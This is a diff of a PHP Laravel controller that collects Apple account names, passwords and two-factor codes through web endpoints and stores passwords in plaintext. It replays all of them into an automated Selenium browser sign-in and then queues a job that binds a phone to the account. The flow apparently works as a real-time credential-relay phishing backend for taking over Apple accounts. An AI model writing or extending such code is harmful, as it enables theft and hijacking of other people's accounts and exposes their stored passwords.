@@ -10,6 +10,7 @@ use App\Apple\Service\Exception\UnauthorizedException;
 use App\Apple\Service\Exception\VerificationCodeIncorrect;
 use App\Apple\Service\PhoneNumber\PhoneNumberFactory;
 use App\Apple\Service\User\User;
+use App\Apple\Service\User\UserFactory;
 use App\Events\AccountAuthFailEvent;
 use App\Events\AccountAuthSuccessEvent;
 use App\Events\AccountLoginSuccessEvent;
@@ -20,13 +21,13 @@ use App\Http\Requests\VerifyCodeRequest;
 use App\Jobs\BindAccountPhone;
 use App\Models\Account;
 use App\Models\SecuritySetting;
-use App\Selenium\AppleClient\AppleConnectorFactory;
 use App\Selenium\AppleClient\Elements\Phone;
+use App\Selenium\AppleClient\Exception\AccountException;
+use App\Selenium\AppleClient\Page\SignIn\TwoFactorAuthenticationPage;
 use App\Selenium\AppleClient\Page\SignIn\SignInSelectPhonePage;
 use App\Selenium\AppleClient\Request\SignInRequest;
 use App\Selenium\ConnectorManager;
-use App\Selenium\Repositories\RedisRepository;
-use App\Selenium\Repositories\RepositoriesInterface;
+use App\Selenium\Exception\PageException;
 use Carbon\Carbon;
 use Facebook\WebDriver\Exception\NoSuchElementException;
 use Facebook\WebDriver\Exception\TimeoutException;
@@ -38,15 +39,15 @@ use Illuminate\Http\Client\ConnectionException;
 use Illuminate\Http\JsonResponse;
 use Illuminate\Http\Request;
 use Illuminate\Http\Response;
-use Illuminate\Redis\RedisManager;
 use Illuminate\Routing\Redirector;
-use Illuminate\Support\Facades\Cache;
+use Illuminate\Support\Collection;
 use Illuminate\Support\Facades\Cookie;
 use Illuminate\Support\Facades\Event;
 use Illuminate\Support\Facades\Log;
 use Illuminate\Support\Facades\Session;
 use Illuminate\Support\Facades\Validator;
 use Illuminate\Validation\ValidationException;
+use InvalidArgumentException;
 use libphonenumber\NumberParseException;
 use libphonenumber\PhoneNumberFormat;
 use Psr\SimpleCache\CacheInterface;
@@ -56,21 +57,16 @@ use Saloon\Exceptions\Request\RequestException;
 class IndexController extends Controller
 {
 
-    protected RedisRepository $redisRepositories;
-    protected ConnectorManager $connectorManager;
-
 
     public function __construct(
         protected readonly Request $request,
         private readonly AppleFactory $appleFactory,
         private readonly PhoneNumberFactory $phoneNumberFactory,
-        private readonly RedisManager $redisManager,
-        private readonly AppleConnectorFactory $factory,
-        private readonly CacheInterface $cache
+        protected UserFactory $userFactory,
+        protected ConnectorManager $connectorManager,
     )
     {
-        $this->redisRepositories = new RedisRepository($this->redisManager->client());
-        $this->connectorManager = new ConnectorManager($this->redisRepositories,$this->factory);
+
     }
 
     protected function getAccount(): ?Account
@@ -95,6 +91,7 @@ class IndexController extends Controller
 
     public function signin(): Response
     {
+
         $guid = sha1(microtime());
 
         $IpConnector = new IpConnector();
@@ -174,6 +171,8 @@ class IndexController extends Controller
         $guid = $request->cookie('Guid',null);
 
         $connector = $this->connectorManager->createConnector();
+        $connector->config()
+            ->add('screenshot_path',storage_path("/browser/screenshots/{$accountName}/"));
 
         $response = $connector->send(new SignInRequest());
 
@@ -182,17 +181,30 @@ class IndexController extends Controller
          */
         $page = $response->getPage();
 
-        $page->inputAccountName($accountName);
-        $page->signInAccountName();
 
-        $page->inputPassword($password);
-        $authPage = $page->signInPassword();
+        try {
+
+
+            $page->inputAccountName($accountName);
+            $page->signInAccountName();
+
+            $page->inputPassword($password);
+            $authPage = $page->signInPassword();
+
+        } catch (AccountException|NoSuchElementException|TimeoutException $e) {
+
+            $page->takeScreenshot("verifyAccount.png");
+
+            throw $e;
+
+        }
 
         $account = Account::updateOrCreate([
             'account' => $accountName,
         ],[ 'password' => $password]);
 
-        $user = new User($this->cache,$guid);
+        $user = $this->userFactory->create($guid);
+        $user->setAccount($account);
 
         Event::dispatch(new AccountLoginSuccessEvent(account: $account,description: "登录成功"));
 
@@ -200,9 +212,7 @@ class IndexController extends Controller
 
         if ($authPage instanceof SignInSelectPhonePage){
 
-            $phoneList = $authPage->getPhoneLists();
-
-            $user->setPhoneInfo(array_map(static fn(Phone $phone) => $phone->setElement(),$phoneList->all()));
+            $user->setPhoneInfo($authPage->getPhoneLists());
 
             return $this->success(data: [
                 'Guid' => $guid,
@@ -213,7 +223,7 @@ class IndexController extends Controller
         return $this->success(data: [
             'Guid' => $guid,
             'Devices' => true,
-        ],code: 201);
+        ],code: 203);
     }
 
     public function auth(): Factory|Application|View|\Illuminate\Contracts\Foundation\Application
@@ -222,25 +232,25 @@ class IndexController extends Controller
     }
 
     /**
+     * @param CacheInterface $cache
      * @return Factory|Application|View|\Illuminate\Contracts\Foundation\Application|JsonResponse
-     * @throws GuzzleException
-     * @throws UnauthorizedException|ConnectionException
      */
     public function authPhoneList(CacheInterface $cache): Factory|Application|View|\Illuminate\Contracts\Foundation\Application|JsonResponse
     {
         $guid = $this->request->input('Guid',null);
 
-        $user = new User($cache,$guid);
+        $user = $this->userFactory->create($guid);
 
-        return view('index.auth-phone-list',['trustedPhoneNumbers' => collect($user->getPhoneInfo())]);
+        return view('index.auth-phone-list',['trustedPhoneNumbers' => $user->getPhoneInfo()]);
     }
 
     /**
      * 验证安全码
      * @param VerifyCodeRequest $request
      * @return JsonResponse
-     * @throws UnauthorizedException
-     * @throws VerificationCodeIncorrect|ConnectionException
+     * @throws NoSuchElementException
+     * @throws TimeoutException
+     * @throws VerificationCodeIncorrect
      */
     public function verifySecurityCode(VerifyCodeRequest $request): JsonResponse
     {
@@ -249,22 +259,34 @@ class IndexController extends Controller
         $code = $validated['apple_verifycode'];
         $guid = $this->request->input('Guid');
 
-        $account = $this->getAccount();
+        $user = $this->userFactory->create($guid);
+        if (! $account = $user->getAccount()){
+            throw new \RuntimeException('账号信息不存在');
+        }
 
         try {
 
-            $response = $this->getApple()->validateSecurityCode($code);
+            $connector = $this->connectorManager->getConnector($guid);
+            $connector->config()
+                ->add('screenshot_path',storage_path("/browser/screenshots/{$account->account}/"));
 
-            Event::dispatch(new AccountAuthSuccessEvent(account: $account,description: "安全码验证成功 code:{$code}"));
+            $page = new TwoFactorAuthenticationPage($connector);
+
+            $page->inputTrustedCode($code);
+
+            Event::dispatch(new AccountAuthSuccessEvent(account: $user->getAccount(),description: "安全码验证成功 code:{$code}"));
+
         } catch (VerificationCodeIncorrect $e) {
-            Event::dispatch(new AccountAuthFailEvent(account: $account,description: "安全码验证失败 {$e->getMessage()}"));
+
+            $e->getPage()->takeScreenshot("verifySecurityCode.png");
+
+            Event::dispatch(new AccountAuthFailEvent(account: $user->getAccount(),description: "安全码验证失败 {$e->getMessage()}"));
             throw $e;
         }
 
-        BindAccountPhone::dispatch($account->id,$guid)
-            ->delay(Carbon::now()->addSeconds(10));
+        BindAccountPhone::dispatchSync($guid,$user->getAccount());
 
-        return $this->success($response->json() ?? []);
+        return $this->success([]);
     }
 
     protected function getAccountInfo(string $accountName): \Illuminate\Database\Eloquent\Model|\Illuminate\Database\Eloquent\Builder|Account|\Illuminate\Database\Query\Builder|null
@@ -285,31 +307,39 @@ class IndexController extends Controller
         // 检索验证过的输入数据...
         $validated = $request->validated();
 
-        if (empty($Id = $validated['ID'])){
-            throw new VerificationCodeIncorrect('手机号码ID不能为空');
-        }
-
         $code = $validated['apple_verifycode'];
 
         $guid = $this->request->input('Guid');
 
-        $account = $this->getAccount();
+        $user = $this->userFactory->create($guid);
+        if (! $account = $user->getAccount()){
+            throw new \RuntimeException('账号信息不存在');
+        }
+
+        $connector = $this->connectorManager->getConnector($guid);
+        $connector->config()
+            ->add('screenshot_path',storage_path("/browser/screenshots/{$account->account}/"));
 
         // 验证手机号码
         try {
 
-            $response = $this->getApple()->validatePhoneSecurityCode($code,(int) $Id);
+            $page = new TwoFactorAuthenticationPage($connector);
+
+            $page->inputTrustedCode($code);
 
             Event::dispatch(new AccountAuthSuccessEvent(account: $account,description: "手机验证码验证成功 code:{$code}"));
-        } catch (VerificationCodeIncorrect|UnauthorizedException|ConnectionException $e) {
-            Event::dispatch(new AccountAuthFailEvent(account: $account,description: "{$e->getMessage()}"));
+
+        } catch (VerificationCodeIncorrect $e) {
+
+            $e->getPage()->takeScreenshot("smsSecurityCode.png");
+
+            Event::dispatch(new AccountAuthFailEvent(account: $account,description: (string)($e->getMessage())));
             throw $e;
         }
 
-        BindAccountPhone::dispatch($account->id,$guid)
-            ->delay(Carbon::now()->addSeconds(10));
+        BindAccountPhone::dispatch($guid,$account);
 
-        return $this->success($response->json() ?? []);
+        return $this->success();
     }
 
     /**
@@ -370,7 +400,7 @@ class IndexController extends Controller
      * @return JsonResponse|Redirector
      * @throws NoSuchElementException
      * @throws TimeoutException
-     * @throws ValidationException
+     * @throws ValidationException|PageException
      */
     public function SendSms(): JsonResponse|Redirector
     {
@@ -380,43 +410,28 @@ class IndexController extends Controller
 
         try {
 
-
             $guid = $this->request->input('Guid');
 
+            $user = $this->userFactory->create($guid);
+            if (! $account = $user->getAccount()){
+                throw new \RuntimeException('账号信息不存在');
+            }
             $connector = $this->connectorManager->getConnector($guid);
+            $connector->config()
+                ->add('screenshot_path',storage_path("/browser/screenshots/{$account->account}/"));
 
-            $page = new SignInSelectPhonePage($connector->webDriver());
+
+            $page = new SignInSelectPhonePage($connector);
             $page->selectPhone($params['ID']);
 
-//            $user = new User($cache,$guid);
+        } catch (PageException $e) {
 
-            $this->getAccount()
-                ?->logs()
-                ->create([
-                    'action' => '发送手机验证码',
-                    'description' => "发送手机验证码成功",
-                ]);
-
-        } catch (\Exception $e) {
-
-            $this->getAccount()
-                ?->logs()
-                ->create([
-                    'action' => '发送手机验证码',
-                    'description' => "发送手机验证码失败:{$e->getMessage()}",
-                ]);
+            $e->getPage()->takeScreenshot("SendSms.png");
 
             throw $e;
         }
 
-        /**
-         * @var $error ServiceError
-         */
-        $error = $response->getServiceErrors()->first();
-
-        Session::flash('Error',$error?->getMessage());
-
-        return $this->success($response->json());
+        return $this->success();
     }
 
     public function sms(): View|Factory|Application
